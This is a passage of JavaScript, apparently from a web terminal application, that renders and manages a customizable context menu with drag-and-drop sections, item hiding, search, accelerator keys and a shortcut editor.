    target.classList.add(placeAfter ? "is-item-drop-after" : "is-item-drop-before");
    return { referenceItemId: target.dataset.customizationId, placeAfter };
  };

  group.addEventListener("dragover", updateIndicator);
  group.addEventListener("dragleave", (event) => {
    if (event.relatedTarget instanceof Node && group.contains(event.relatedTarget)) return;
    clearContextCustomizationDropIndicators();
  });
  group.addEventListener("drop", (event) => {
    if (!ctxCustomizationDrag) return;
    const location = updateIndicator(event);
    event.preventDefault();
    event.stopPropagation();
    const moved = moveContextMenuItem(
      ctxCustomizationDrag.itemId,
      sectionId,
      location?.referenceItemId,
      location?.placeAfter
    );
    finishContextCustomizationDrag();
    if (moved) rerenderOpenContextMenu({ focusSearch: false });
  });
}

function cancelContextSectionRename() {
  if (!ctxEditingSectionId) return;
  if (ctxEditingSectionId === ctxNewSectionId && ctxCustomizationModel) {
    ctxCustomizationModel.sections = ctxCustomizationModel.sections
      .filter((section) => section.id !== ctxNewSectionId);
    persistContextMenuCustomizationModel();
  }
  ctxEditingSectionId = null;
  ctxNewSectionId = null;
  if (!elements.contextMenu.hidden) rerenderOpenContextMenu();
}

function commitContextSectionRename(sectionId, rawName) {
  if (ctxEditingSectionId !== sectionId) return;
  const section = contextMenuSection(sectionId);
  const name = normalizeContextMenuSectionName(rawName);
  if (section && name) section.name = name;
  if (!name && sectionId === ctxNewSectionId && ctxCustomizationModel) {
    ctxCustomizationModel.sections = ctxCustomizationModel.sections
      .filter((entry) => entry.id !== sectionId);
  }
  ctxEditingSectionId = null;
  ctxNewSectionId = null;
  persistContextMenuCustomizationModel();
  if (!elements.contextMenu.hidden) rerenderOpenContextMenu();
}

function startContextSectionRename(sectionId) {
  if (!contextMenuSection(sectionId)) return;
  const searchInput = elements.contextMenu.querySelector(".ctx-menu-search-input");
  if (searchInput) searchInput.value = "";
  ctxEditingSectionId = sectionId;
  rerenderOpenContextMenu({ focusSearch: false });
}

function addContextMenuSection() {
  if (!ctxCustomizationModel) return;
  if (ctxCustomizationModel.sections.length >= CONTEXT_MENU_MAX_SECTIONS) {
    toast(`Context menus support up to ${CONTEXT_MENU_MAX_SECTIONS} sections`, "error", 2200);
    return;
  }
  let id;
  do {
    id = `custom:${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 8)}`;
  } while (contextMenuSection(id));
  ctxCustomizationModel.sections.push({ id, name: "New section", custom: true, items: [] });
  ctxEditingSectionId = id;
  ctxNewSectionId = id;
  persistContextMenuCustomizationModel();
  const searchInput = elements.contextMenu.querySelector(".ctx-menu-search-input");
  if (searchInput) searchInput.value = "";
  rerenderOpenContextMenu({ focusSearch: false });
}

function removeContextMenuSection(sectionId) {
  if (!ctxCustomizationModel) return false;
  const sections = ctxCustomizationModel.sections;
  const index = sections.findIndex((section) => section.id === sectionId);
  if (index < 0) return false;
  if (sections.length <= 1) {
    toast("Keep at least one context-menu section", "error", 2200);
    return false;
  }

  const section = sections[index];
  const destination = sections[index + 1] || sections[index - 1];
  destination.items.push(...section.items);
  sections.splice(index, 1);
  if (section.custom) ctxCustomizationModel.removedSections.delete(sectionId);
  else ctxCustomizationModel.removedSections.add(sectionId);
  persistContextMenuCustomizationModel();
  hideContextSubmenu();
  rerenderOpenContextMenu({ focusSearch: false });
  const moved = section.items.length;
  toast(
    moved
      ? `${section.name} removed; ${moved} item${moved === 1 ? "" : "s"} moved to ${destination.name}`
      : `${section.name} removed`,
    "success",
    2400
  );
  return true;
}

function showContextSectionMenu(event, sectionId) {
  event.preventDefault();
  event.stopPropagation();
  renderContextSubmenu([
    {
      label: "Rename section",
      icon: "pencil",
      keepMenuOpen: true,
      run: () => startContextSectionRename(sectionId)
    },
    {
      label: "Remove section",
      icon: "trash-2",
      danger: true,
      keepMenuOpen: true,
      run: () => removeContextMenuSection(sectionId)
    }
  ]);
  const rect = event.currentTarget.getBoundingClientRect();
  showContextSubmenuAt(rect.right, rect.bottom);
}

function setContextMenuItemHidden(itemId, hidden) {
  if (!ctxCustomizationModel || !CONTEXT_MENU_ID_PATTERN.test(itemId)) return;
  if (hidden) ctxCustomizationModel.hidden.add(itemId);
  else ctxCustomizationModel.hidden.delete(itemId);
  persistContextMenuCustomizationModel();
  hideContextSubmenu();
  rerenderOpenContextMenu();
}

function toggleContextMenuHiddenItems() {
  ctxShowHiddenItems = !ctxShowHiddenItems;
  rerenderOpenContextMenu();
}

function showContextCustomizationMenu(event, item) {
  event.preventDefault();
  event.stopPropagation();
  const hidden = ctxCustomizationModel?.hidden.has(item.customizationId);
  renderContextSubmenu([{
    label: hidden ? "Show item" : "Hide item",
    icon: hidden ? "eye" : "eye-off",
    keepMenuOpen: true,
    run: () => setContextMenuItemHidden(item.customizationId, !hidden)
  }]);
  showContextSubmenuAt(event.clientX, event.clientY);
}

function toggleContextShortcutEditor() {
  ctxShortcutEditing = !ctxShortcutEditing;
  ctxShortcutCapture = null;
  ctxShortcutStatus = ctxShortcutEditing
    ? "Choose Set beside an action, then press 1-9 or a modifier shortcut."
    : "";
  rerenderOpenContextMenu();
}

function beginContextShortcutCapture(item) {
  if (!item.shortcutId) return;
  ctxShortcutCapture = { actionId: item.shortcutId, label: item.label };
  const current = contextMenuShortcuts.get(item.shortcutId);
  ctxShortcutStatus = current
    ? `Press a replacement for ${item.label}. Delete clears ${formatContextShortcut(current)}; Esc cancels.`
    : `Press 1-9 or a modifier + key for ${item.label}. Esc cancels.`;
  rerenderOpenContextMenu({ focusSearch: false });
}

function cancelContextShortcutCapture() {
  if (!ctxShortcutCapture) return;
  ctxShortcutCapture = null;
  ctxShortcutStatus = "Choose Set beside an action, then press 1-9 or a modifier shortcut.";
  rerenderOpenContextMenu();
}

// Picks a unique, memorable accelerator letter for a label: word initials first
// (so "Find in all terminals" prefers F, then I, A, T), then any remaining
// letter, skipping ones already claimed by earlier rows in the same menu.
function assignAccelLetter(label, used) {
  const lower = String(label).toLowerCase();
  const positions = [];
  const wordRe = /[a-z0-9]+/g;
  let match;
  while ((match = wordRe.exec(lower))) positions.push(match.index);
  // Fall back to every remaining character so a short unique letter can still be
  // found once all the word initials are taken.
  for (let i = 0; i < lower.length; i += 1) positions.push(i);
  for (const index of positions) {
    const ch = lower[index];
    if (ch < "a" || ch > "z") continue; // letters only; digits belong to badges
    if (used.has(ch)) continue;
    used.add(ch);
    return { key: ch, index };
  }
  return null;
}

// Builds a label node, underlining the accelerator character in place so the
// shortcut reads straight off the menu.
function renderAccelLabel(text, index) {
  const label = document.createElement("span");
  label.className = "ctx-label";
  if (index == null || index < 0 || index >= text.length) {
    label.textContent = text;
    return label;
  }
  label.append(document.createTextNode(text.slice(0, index)));
  const key = document.createElement("u");
  key.className = "ctx-key";
  key.textContent = text[index];
  label.append(key);
  label.append(document.createTextNode(text.slice(index + 1)));
  return label;
}

function renderContextMenu(items, {
  customizable = false,
  grouped = false,
  searchable = false,
  shortcutEditor = false
} = {}) {
  hideContextSubmenu();
  ctxRenderedItems = items;
  ctxRenderOptions = { customizable, grouped, searchable, shortcutEditor };
  let renderItems = items;
  if (customizable) {
    const customized = buildCustomizableContextMenu(items);
    renderItems = customized.items;
    ctxCustomizationModel = customized.model;
  } else {
    ctxCustomizationModel = null;
    ctxCustomizationDrag = null;
    ctxSectionDrag = null;
    ctxEditingSectionId = null;
    ctxNewSectionId = null;
    ctxShowHiddenItems = false;
  }
  if (!shortcutEditor) {
    ctxShortcutCapture = null;
    ctxShortcutEditing = false;
    ctxShortcutStatus = "";
  }
  elements.contextMenu.innerHTML = "";
  elements.contextMenu.classList.toggle("is-grouped", grouped);
  elements.contextMenu.classList.toggle("has-search", searchable);
  elements.contextMenu.classList.toggle("is-shortcut-editing", shortcutEditor && ctxShortcutEditing);
  elements.contextMenu.classList.toggle("is-customizable", customizable);
  ctxFocusables = [];
  ctxAllFocusables = [];
  ctxKeyIndex = -1;
  ctxByLetter.clear();
  ctxByNumber.clear();
  ctxByShortcut.clear();
  ctxSubmenus.clear();
  elements.contextMenu.removeAttribute("aria-activedescendant");
  const usedLetters = new Set();
  let rowId = 0;
  let itemContainer = elements.contextMenu;
  let groupsRoot = null;
  let groupColumns = null;
  const groupColumnWeights = [0, 0];

  if (searchable) {
    const toolbar = document.createElement("div");
    toolbar.className = "ctx-menu-toolbar";
    const search = document.createElement("label");
    search.className = "ctx-menu-search";
    const searchIcon = document.createElement("i");
    searchIcon.dataset.lucide = "search";
    const searchInput = document.createElement("input");
    searchInput.className = "ctx-menu-search-input";
    searchInput.type = "search";
    searchInput.autocomplete = "off";
    searchInput.spellcheck = false;
    searchInput.placeholder = "Search terminal actions";
    searchInput.setAttribute("aria-label", "Search terminal actions");
    searchInput.addEventListener("input", () => filterContextMenu(searchInput.value));
    search.append(searchIcon, searchInput);
    toolbar.append(search);
    if (shortcutEditor) {
      const editShortcuts = document.createElement("button");
      editShortcuts.type = "button";
      editShortcuts.className = "ctx-shortcut-edit-toggle";
      editShortcuts.title = ctxShortcutEditing ? "Finish editing shortcuts" : "Customize menu shortcuts";
      editShortcuts.setAttribute("aria-label", editShortcuts.title);
      editShortcuts.setAttribute("aria-pressed", String(ctxShortcutEditing));
      const editIcon = document.createElement("i");
      editIcon.dataset.lucide = ctxShortcutEditing ? "check" : "keyboard";
      editShortcuts.append(editIcon);
      editShortcuts.addEventListener("click", (event) => {
        event.stopPropagation();
        toggleContextShortcutEditor();
      });
      toolbar.append(editShortcuts);
    }
    elements.contextMenu.append(toolbar);
    if (shortcutEditor && ctxShortcutEditing) {
      const capture = document.createElement("div");
      capture.className = `ctx-shortcut-capture${ctxShortcutCapture ? " is-capturing" : ""}`;
      capture.setAttribute("role", "status");
      capture.setAttribute("aria-live", "polite");
      const captureText = document.createElement("span");
      captureText.textContent = ctxShortcutStatus;
      capture.append(captureText);
      if (ctxShortcutCapture) {
        const cancel = document.createElement("button");
        cancel.type = "button";
        cancel.className = "ctx-shortcut-cancel";
        cancel.title = "Cancel shortcut capture";
        cancel.setAttribute("aria-label", cancel.title);
        const cancelIcon = document.createElement("i");
        cancelIcon.dataset.lucide = "x";
        cancel.append(cancelIcon);
        cancel.addEventListener("click", (event) => {
          event.stopPropagation();
          cancelContextShortcutCapture();
        });
        capture.append(cancel);
      }
      elements.contextMenu.append(capture);
    }
  }

  if (grouped) {
    groupsRoot = document.createElement("div");
    groupsRoot.className = "ctx-groups";
    groupColumns = [0, 1].map(() => {
      const column = document.createElement("div");
      column.className = "ctx-group-column";
      groupsRoot.append(column);
      return column;
    });
    elements.contextMenu.append(groupsRoot);
    itemContainer = groupsRoot;
  }

  for (let itemIndex = 0; itemIndex < renderItems.length; itemIndex += 1) {
    const item = renderItems[itemIndex];
    if (item.group) {
      let groupWeight = 0;
      for (let nextIndex = itemIndex + 1; nextIndex < renderItems.length && !renderItems[nextIndex].group; nextIndex += 1) {
        if (!renderItems[nextIndex].separator) groupWeight += 1;
      }
      const columnIndex = groupColumnWeights[0] <= groupColumnWeights[1] ? 0 : 1;
      groupColumnWeights[columnIndex] += groupWeight;
      const group = document.createElement("section");
      group.className = "ctx-group";
      if (item.customSection) group.classList.add("is-custom-section");
      if (item.groupId) group.dataset.sectionId = item.groupId;
      group.dataset.groupSearch = item.group.toLowerCase();
      const header = document.createElement("div");
      header.className = "ctx-group-header";
      const title = document.createElement("h3");
      title.className = "ctx-group-title";
      const body = document.createElement("div");
      body.className = "ctx-group-body";
      if (customizable && item.groupId) {
        const dragHandle = document.createElement("button");
        dragHandle.type = "button";
        dragHandle.className = "ctx-section-drag-handle ctx-customization-control";
        dragHandle.draggable = ctxEditingSectionId !== item.groupId;
        dragHandle.title = `Drag to move ${item.group} section`;
        dragHandle.setAttribute("aria-label", dragHandle.title);
        const dragIcon = document.createElement("i");
        dragIcon.dataset.lucide = "grip-vertical";
        dragHandle.append(dragIcon);
        dragHandle.addEventListener("dragstart", (event) => {
          startContextSectionDrag(event, item.groupId, group);
        });
        dragHandle.addEventListener("dragend", finishContextSectionDrag);
        header.append(dragHandle);
        if (ctxEditingSectionId === item.groupId) {
          const input = document.createElement("input");
          input.className = "ctx-group-title-input ctx-customization-control";
          input.type = "text";
          input.maxLength = 48;
          input.autocomplete = "off";
          input.spellcheck = false;
          input.value = item.group;
          input.setAttribute("aria-label", `Rename ${item.group} section`);
          input.addEventListener("click", (event) => event.stopPropagation());
          input.addEventListener("pointerdown", (event) => event.stopPropagation());
          input.addEventListener("keydown", (event) => {
            event.stopPropagation();
            if (event.key === "Enter") {
              event.preventDefault();
              commitContextSectionRename(item.groupId, input.value);
            } else if (event.key === "Escape") {
              event.preventDefault();
              cancelContextSectionRename();
            }
          });
          input.addEventListener("blur", () => {
            commitContextSectionRename(item.groupId, input.value);
          });
          title.append(input);
        } else {
          title.textContent = item.group;
          title.classList.add("is-editable");
          title.tabIndex = 0;
          title.setAttribute("role", "button");
          title.title = "Click to rename section";
          title.setAttribute("aria-label", `Rename ${item.group} section`);
          title.addEventListener("click", () => startContextSectionRename(item.groupId));
          title.addEventListener("keydown", (event) => {
            if (event.key !== "Enter" && event.key !== " ") return;
            event.preventDefault();
            event.stopPropagation();
            startContextSectionRename(item.groupId);
          });
        }
        const sectionActions = document.createElement("button");
        sectionActions.type = "button";
        sectionActions.className = "ctx-section-actions ctx-customization-control";
        sectionActions.title = `${item.group} section options`;
        sectionActions.setAttribute("aria-label", sectionActions.title);
        const actionsIcon = document.createElement("i");
        actionsIcon.dataset.lucide = "ellipsis";
        sectionActions.append(actionsIcon);
        sectionActions.addEventListener("click", (event) => showContextSectionMenu(event, item.groupId));
        header.append(title, sectionActions);
        bindContextMenuSectionDropTarget(group, body, item.groupId);
        bindContextMenuSectionReorderTarget(group, item.groupId);
      } else {
        title.textContent = item.group;
        header.append(title);
      }
      group.append(header, body);
      (groupColumns?.[columnIndex] || groupsRoot || elements.contextMenu).append(group);
      itemContainer = body;
      continue;
    }
    if (item.separator) {
      const sep = document.createElement("div");
      sep.className = "ctx-sep";
      itemContainer.append(sep);
      continue;
    }

    const el = document.createElement("div");
    el.className = `ctx-item${item.danger ? " danger" : ""}${item.info ? " ctx-info" : ""}${item.customizationHidden ? " is-customization-hidden" : ""}`;
    if (item.shortcutId) el.dataset.shortcutId = item.shortcutId;
    if (customizable && item.customizationId && item.customizationSectionId) {
      el.dataset.customizationId = item.customizationId;
      el.dataset.customizationSectionId = item.customizationSectionId;
      el.draggable = true;
      el.addEventListener("dragstart", (event) => {
        startContextCustomizationDrag(event, item, el);
      });
      el.addEventListener("dragend", finishContextCustomizationDrag);
      el.addEventListener("contextmenu", (event) => showContextCustomizationMenu(event, item));
    } else if (item.headerAction && item.headerActionTerminalId) {
      el.dataset.headerAction = item.headerAction;
      el.draggable = true;
      el.addEventListener("dragstart", (event) => {
        startHeaderActionDrag(event, item.headerActionTerminalId, item.headerAction, el);
      });
      el.addEventListener("dragend", finishHeaderActionDrag);
    }
    el.dataset.searchText = [item.label, item.title, item.hint]
      .filter(Boolean)
      .join(" ")
      .toLowerCase();
    // An info row reports a fact rather than offering an action, so it is not a
    // menuitem and must not be reachable or announced as one.
    el.setAttribute("role", item.info ? "presentation" : "menuitem");
    if (item.disabled || item.customizationHidden) el.setAttribute("aria-disabled", "true");

    const icon = document.createElement("i");
    icon.setAttribute("data-lucide", item.icon);
    el.append(icon);

    if (item.input && !item.customizationHidden) {
      el.classList.add("ctx-input-row");
      el.setAttribute("role", "presentation");
      const field = document.createElement("label");
      field.className = "ctx-command-field";
      const caption = document.createElement("span");
      caption.textContent = item.label;
      const input = document.createElement("input");
      input.className = "ctx-command-input";
      input.type = "text";
      input.autocomplete = "off";
      input.spellcheck = false;
      input.placeholder = item.placeholder || "";
      input.value = item.value || "";
      input.addEventListener("keydown", (event) => {
        event.stopPropagation();
        if (event.key === "Enter" && !event.isComposing) {
          event.preventDefault();
          const value = input.value.trim();
          if (!value) return;
          runContextMenuAction(item.run, value);
        } else if (event.key === "Escape") {
          event.preventDefault();
          hideContextMenu();
        }
      });
      field.append(caption, input);
      const suggestions = Array.isArray(item.suggestions) ? item.suggestions.slice(0, COPILOT_CWD_HISTORY_LIMIT) : [];
      if (suggestions.length > 0) {
        const history = document.createElement("div");
        history.className = "ctx-command-suggestions";
        history.setAttribute("aria-label", `${item.label} recent values`);
        for (const suggestion of suggestions) {
          const button = document.createElement("button");
          button.type = "button";
          button.className = "ctx-command-suggestion";
          button.textContent = suggestion;
          button.title = suggestion;
          button.addEventListener("click", (event) => {
            event.preventDefault();
            event.stopPropagation();
            input.value = suggestion;
            input.focus();
          });
          history.append(button);
        }
        field.append(history);
      }
      el.append(field);
      itemContainer.append(el);
      continue;
    }

    // A row can carry several independent actions (the logging row offers both the
    // log file and a stop control), in which case the row itself is not clickable
    // and each part handles its own activation.
    if (item.parts && !item.customizationHidden) {
      el.classList.add("ctx-multi");
      const label = document.createElement("span");
      label.className = "ctx-parts";
      label.setAttribute("aria-label", item.label);
      for (const part of item.parts) {
        if (!part.run) {
          label.append(document.createTextNode(part.text));
          continue;
        }

        const action = document.createElement("button");
        action.type = "button";
        action.className = `ctx-part${part.className ? ` ${part.className}` : ""}`;
        action.textContent = part.text;
        if (part.title) action.title = part.title;
        action.addEventListener("click", (event) => {
          event.stopPropagation();
          runContextMenuAction(part.run);
        });
        label.append(action);
      }
      el.append(label);
      itemContainer.append(el);
      continue;
    }

    // A plain row you can actually run is the only kind that earns an accelerator.
    const actionable = Boolean(item.run) && !item.disabled && !item.info && !item.customizationHidden;
    const shortcutEligible = shortcutEditor && actionable && CONTEXT_SHORTCUT_ID_PATTERN.test(item.shortcutId || "");
    const customBinding = shortcutEditor && item.shortcutId
      ? contextMenuShortcuts.get(item.shortcutId)
      : null;
    const accel = actionable ? assignAccelLetter(item.label, usedLetters) : null;
    const number = actionable && !shortcutEditor && ctxByNumber.size < 9 ? ctxByNumber.size + 1 : null;

    el.append(renderAccelLabel(item.label, accel ? accel.index : -1));

    // Rows whose label cannot spell out the whole story (a path, say) carry the
    // detail as a tooltip rather than growing the menu.
    if (item.title) el.title = item.title;

    // The keyboard hint and the number badge share a right-aligned tail so they
    // never collide with the label; a submenu parent adds a chevron at the end.
    if (item.hint
      || number != null
      || item.submenu
      || customBinding
      || item.customizationHidden
      || (ctxShortcutEditing && shortcutEligible)) {
      const accessories = document.createElement("span");
      accessories.className = "ctx-accessories";
      if (item.hint) {
        const hint = document.createElement("span");
        hint.className = "ctx-hint";
        hint.textContent = item.hint;
        accessories.append(hint);
      }
      if (number != null) {
        const badge = document.createElement("span");
        badge.className = "ctx-accel-num";
        // The digit is painted by CSS (::after) rather than a text node so this
        // purely decorative, aria-hidden affordance never leaks into the row's
        // textContent — keyboard activation reads dataset.accelNum, not this label.
        badge.setAttribute("data-num", String(number));
        badge.setAttribute("aria-hidden", "true");
        accessories.append(badge);
      }
      if (ctxShortcutEditing && shortcutEligible) {
        const shortcutButton = document.createElement("button");
        shortcutButton.type = "button";
        shortcutButton.className = "ctx-shortcut-set";
        shortcutButton.textContent = customBinding ? formatContextShortcut(customBinding) : "Set";
        shortcutButton.title = customBinding
          ? `Change shortcut for ${item.label}`
          : `Set shortcut for ${item.label}`;
        shortcutButton.setAttribute("aria-label", shortcutButton.title);
        shortcutButton.addEventListener("click", (event) => {
          event.stopPropagation();
          beginContextShortcutCapture(item);
        });
        accessories.append(shortcutButton);
      } else if (customBinding) {
        const shortcut = document.createElement("span");
        shortcut.className = "ctx-shortcut-key";
        shortcut.textContent = formatContextShortcut(customBinding);
        shortcut.setAttribute("aria-label", `Custom shortcut ${shortcut.textContent}`);
        accessories.append(shortcut);
      }
      if (item.customizationHidden) {
        const hidden = document.createElement("span");
        hidden.className = "ctx-hidden-badge";
        hidden.textContent = "Hidden";
        accessories.append(hidden);
      }
      if (item.submenu) {
        const caret = document.createElement("span");
        caret.className = "ctx-submenu-caret";
        caret.setAttribute("aria-hidden", "true");
        const caretIcon = document.createElement("i");
        caretIcon.setAttribute("data-lucide", "chevron-right");
        caret.append(caretIcon);
        accessories.append(caret);
      }
      el.append(accessories);
    }

    if (actionable) {
      el.id = `ctx-item-${rowId++}`;
      el.addEventListener("click", () => {
        if (ctxSuppressCustomizationClick) return;
        runContextMenuAction(item.run);
      });
      // Keep the keyboard highlight in step with the pointer so the two input
      // modes never disagree about which row is current. A submenu parent also
      // opens its panel on hover; any other row dismisses an open panel.
      el.addEventListener("pointerenter", () => {
        setContextFocus(ctxFocusables.indexOf(el));
        if (item.submenu) openContextSubmenuFor(el, item.submenu);
        else scheduleSubmenuClose();
      });
      ctxFocusables.push(el);
      ctxAllFocusables.push(el);
      if (item.submenu) {
        el.setAttribute("aria-haspopup", "menu");
        el.setAttribute("aria-expanded", "false");
        ctxSubmenus.set(el, item.submenu);
      }
      if (accel) {
        el.dataset.accelKey = accel.key;
        ctxByLetter.set(accel.key, el);
      }
      if (number != null) {
        el.dataset.accelNum = String(number);
        ctxByNumber.set(String(number), el);
      }
      if (customBinding) {
        const signature = contextShortcutSignature(customBinding);
        el.dataset.shortcutSignature = signature;
        ctxByShortcut.set(signature, el);
      }
    }

    itemContainer.append(el);
  }

  if (customizable) {
    for (const body of elements.contextMenu.querySelectorAll(".ctx-group-body")) {
      if (body.querySelector(".ctx-item")) continue;
      const empty = document.createElement("div");
      empty.className = "ctx-group-empty";
      empty.textContent = "Drop items here";
      body.append(empty);
    }
  }

  if (searchable) {
    const empty = document.createElement("p");
    empty.className = "ctx-search-empty";
    empty.textContent = "No matching actions";
    empty.hidden = true;
    elements.contextMenu.append(empty);
  }
  if (customizable) {
    const footer = document.createElement("div");
    footer.className = "ctx-customize-footer";
    const addSection = document.createElement("button");
    addSection.type = "button";
    addSection.className = "ctx-add-section ctx-customization-control";
    addSection.textContent = "Add section";
    addSection.addEventListener("click", (event) => {
      event.stopPropagation();
      addContextMenuSection();
    });
    footer.append(addSection);
    if (ctxCustomizationModel?.hiddenCurrentCount > 0) {
      const showHidden = document.createElement("button");
      showHidden.type = "button";
      showHidden.className = "ctx-show-hidden ctx-customization-control";
      showHidden.textContent = ctxShowHiddenItems ? "Hide hidden items" : "Show hidden items";
      showHidden.title = `${ctxCustomizationModel.hiddenCurrentCount} hidden menu item${ctxCustomizationModel.hiddenCurrentCount === 1 ? "" : "s"}`;
      showHidden.addEventListener("click", (event) => {
        event.stopPropagation();
        toggleContextMenuHiddenItems();
      });
      footer.append(showHidden);
    }
    elements.contextMenu.append(footer);
  }
}

function filterContextMenu(value) {
  hideContextSubmenu();
  const query = String(value || "").trim().toLowerCase();
  let visibleRows = 0;
  for (const group of elements.contextMenu.querySelectorAll(".ctx-group")) {
    const groupMatches = Boolean(query) && group.dataset.groupSearch.includes(query);
    let groupRows = 0;
    for (const row of group.querySelectorAll(".ctx-item")) {
      const visible = !query || groupMatches || row.dataset.searchText.includes(query);
      row.hidden = !visible;
      if (visible) groupRows += 1;
    }
    group.hidden = query ? groupRows === 0 : !ctxRenderOptions.customizable && groupRows === 0;
    visibleRows += groupRows;
  }
  setContextFocus(-1);
  ctxFocusables = ctxAllFocusables.filter((row) => !row.hidden && !row.closest(".ctx-group")?.hidden);
  const empty = elements.contextMenu.querySelector(".ctx-search-empty");
  if (empty) empty.hidden = !query || visibleRows > 0;
}

// Renders the rows of the hover submenu into its own panel. Kept separate from
// renderContextMenu so it never disturbs the parent menu's focus/accelerator
// bookkeeping. Rows are plain: an icon, a label, and (for real commands) a click
// that inserts the command and closes the whole menu.
function renderContextSubmenu(items) {
  const menu = elements.contextSubmenu;
  menu.innerHTML = "";
  subFocusables = [];
  subKeyIndex = -1;

  for (const item of items) {
    const el = document.createElement("div");
    el.className = `ctx-item${item.info ? " ctx-info" : ""}${item.danger ? " danger" : ""}`;
    el.setAttribute("role", item.info ? "presentation" : "menuitem");

    const icon = document.createElement("i");
    icon.setAttribute("data-lucide", item.icon);
    el.append(icon);

    const label = document.createElement("span");
    label.className = "ctx-label ctx-submenu-label";
    label.textContent = item.label;
    el.append(label);

    if (item.title) el.title = item.title;

    if (item.run && !item.info) {
      el.addEventListener("click", () => {
        if (item.keepMenuOpen) {
          hideContextSubmenu();
          item.run();
        } else {
          runContextMenuAction(item.run);
        }
      });
      el.addEventListener("pointerenter", () => setSubmenuFocus(subFocusables.indexOf(el)));
      subFocusables.push(el);
    }

    menu.append(el);
  }
}

function showContextSubmenuAt(x, y) {
  cancelSubmenuClose();
  if (activeSubmenuParent) {
    activeSubmenuParent.setAttribute("aria-expanded", "false");
    activeSubmenuParent = null;
  }
  const menu = elements.contextSubmenu;
  menu.classList.add("is-positioning");
  menu.hidden = false;
  menu.style.left = "0px";
  menu.style.top = "0px";
  refreshIcons(menu);
  const rect = menu.getBoundingClientRect();
  const left = Math.max(8, Math.min(x, window.innerWidth - rect.width - 8));
  const top = Math.max(8, Math.min(y, window.innerHeight - rect.height - 8));
  menu.style.left = `${left}px`;
  menu.style.top = `${top}px`;
  menu.classList.remove("is-positioning");
}

// Opens (or keeps open) the submenu belonging to a parent row, anchored to that
// row's right edge and flipping to the left when there is no room.
function openContextSubmenuFor(parentEl, items) {
  cancelSubmenuClose();
  if (activeSubmenuParent === parentEl && !elements.contextSubmenu.hidden) return;
  if (activeSubmenuParent && activeSubmenuParent !== parentEl) {
    activeSubmenuParent.setAttribute("aria-expanded", "false");
  }
  activeSubmenuParent = parentEl;
  renderContextSubmenu(items);

  const menu = elements.contextSubmenu;
  menu.classList.add("is-positioning");
  menu.hidden = false;
  menu.style.left = "0px";
  menu.style.top = "0px";
  // Swap the <i data-lucide> placeholders for real SVGs before measuring, for the
  // same width-accuracy reason the main menu does.
  refreshIcons(menu);

  const parent = parentEl.getBoundingClientRect();
  const rect = menu.getBoundingClientRect();
  let left = parent.right - 4;
  if (left + rect.width > window.innerWidth - 8) left = parent.left - rect.width + 4;
  left = Math.max(8, Math.min(left, window.innerWidth - rect.width - 8));
  let top = Math.max(8, Math.min(parent.top - 6, window.innerHeight - rect.height - 8));
  menu.style.left = `${left}px`;
  menu.style.top = `${top}px`;
  menu.classList.remove("is-positioning");
  parentEl.setAttribute("aria-expanded", "true");
}

function hideContextSubmenu() {
  cancelSubmenuClose();
  if (!elements.contextSubmenu.hidden) {
    elements.contextSubmenu.hidden = true;
    elements.contextSubmenu.innerHTML = "";
  }
  if (activeSubmenuParent) {
    activeSubmenuParent.setAttribute("aria-expanded", "false");
    activeSubmenuParent = null;
  }
  subFocusables = [];
  subKeyIndex = -1;
}

// Sliding the pointer between the parent row and its panel briefly leaves both,
// so closing is deferred and cancelled the moment either is re-entered.
function scheduleSubmenuClose() {
  cancelSubmenuClose();
  submenuCloseTimer = window.setTimeout(hideContextSubmenu, 140);
}

function cancelSubmenuClose() {
  if (submenuCloseTimer) {
    window.clearTimeout(submenuCloseTimer);
    submenuCloseTimer = 0;
  }
}

function setSubmenuFocus(index) {
  if (subKeyIndex >= 0 && subFocusables[subKeyIndex]) {
    subFocusables[subKeyIndex].classList.remove("is-key-focus");
  }
  subKeyIndex = index;
  const el = subFocusables[index];
  if (el) {
    el.classList.add("is-key-focus");
    el.scrollIntoView({ block: "nearest" });
  }
}

function moveSubmenuFocus(delta) {
  if (!subFocusables.length) return;
  let next = subKeyIndex;
  if (next < 0) next = delta > 0 ? 0 : subFocusables.length - 1;
  else next = (next + delta + subFocusables.length) % subFocusables.length;
  setSubmenuFocus(next);
}

// Moves the keyboard highlight to a specific row, syncing the class, scroll
// position and aria-activedescendant that a screen reader follows.
function setContextFocus(index) {
  if (ctxKeyIndex >= 0 && ctxFocusables[ctxKeyIndex]) {
    ctxFocusables[ctxKeyIndex].classList.remove("is-key-focus");
  }
  ctxKeyIndex = index;
  const el = ctxFocusables[index];
  if (el) {
    el.classList.add("is-key-focus");
    el.scrollIntoView({ block: "nearest" });
    elements.contextMenu.setAttribute("aria-activedescendant", el.id);
  } else {
    elements.contextMenu.removeAttribute("aria-activedescendant");
  }
}

// Steps the highlight by delta, wrapping around, and seeds the first/last row
// when nothing is highlighted yet so a single arrow press always lands.
function moveContextFocus(delta) {
  if (!ctxFocusables.length) return;
  let next = ctxKeyIndex;
  if (next < 0) next = delta > 0 ? 0 : ctxFocusables.length - 1;
  else next = (next + delta + ctxFocusables.length) % ctxFocusables.length;
  setContextFocus(next);
}

// While the menu owns the screen it also owns the keyboard: navigation keys move
// the highlight, Enter/Space run the highlighted row, and any unmodified letter
// or 1-9 digit fires its accelerator. Stray keys are swallowed so they never
// leak into the terminal underneath.
function onContextMenuKeydown(event) {
  if (elements.contextMenu.hidden) return;
  if (event.target instanceof Element
    && event.target.closest(".ctx-command-input, .ctx-command-suggestion, .ctx-customization-control, .ctx-group-title.is-editable")) return;
  const key = event.key;
  const stop = () => {
    event.preventDefault();
    event.stopPropagation();
  };

  if (ctxShortcutCapture) {
    const hasModifier = event.ctrlKey || event.altKey || event.shiftKey || event.metaKey;
    if (key === "Escape" && !hasModifier) {
      cancelContextShortcutCapture();
      stop();
      return;
    }
    if ((key === "Delete" || key === "Backspace") && !hasModifier) {
      const cleared = clearContextMenuShortcut(ctxShortcutCapture.actionId);
      ctxShortcutStatus = cleared
        ? `Cleared the shortcut for ${ctxShortcutCapture.label}.`
        : `${ctxShortcutCapture.label} has no shortcut to clear.`;
      ctxShortcutCapture = null;
      rerenderOpenContextMenu();
      stop();
      return;
    }
    if (CONTEXT_SHORTCUT_MODIFIER_KEYS.has(String(key).toLowerCase())) {
      stop();
      return;
    }
    const binding = contextShortcutFromEvent(event);
    if (!binding) {
      ctxShortcutStatus = "Use 1-9 by itself, or hold Ctrl, Alt, Shift, or Meta with another key.";
      rerenderOpenContextMenu({ focusSearch: false });
      stop();
      return;
    }
    const capture = ctxShortcutCapture;
    const displacedActionId = assignContextMenuShortcut(capture.actionId, binding);
